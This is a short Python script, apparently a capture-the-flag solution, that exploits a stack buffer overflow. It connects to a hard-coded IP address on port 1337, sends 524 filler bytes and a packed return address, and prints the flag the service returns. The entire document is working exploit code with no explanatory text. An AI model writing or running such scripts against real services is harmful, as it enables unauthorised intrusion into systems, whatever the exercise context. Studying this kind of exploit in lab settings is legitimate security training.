import socket
import struct

ip = "159.89.252.100"
port = 1337

offset = 524
overflow = b"A" * offset
retn = struct.pack("<L", 0x004017fc)  # Replace with the actual return address

payload = overflow + retn + b"\n"

try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as p:
        p.connect((ip, port))
        print(f"Connected to {ip}:{port}")

        welcome_message = p.recv(1024)
        print(f"Received: {welcome_message.decode()}")

        print(f"Sending payload...")
        p.sendall(payload)

        flag = p.recv(1024)
        print(f"Received flag: {flag.decode().strip()}")

        full_response = b""
        while True:
            try:
                data = p.recv(1024)
                if not data:
                    break
                full_response += data
            except socket.error:
                break
        
        print("\n[+] Full response from server:")
        print(full_response.decode(errors='ignore').strip())

except Exception as e:
    print(f"Connection failed: {e}")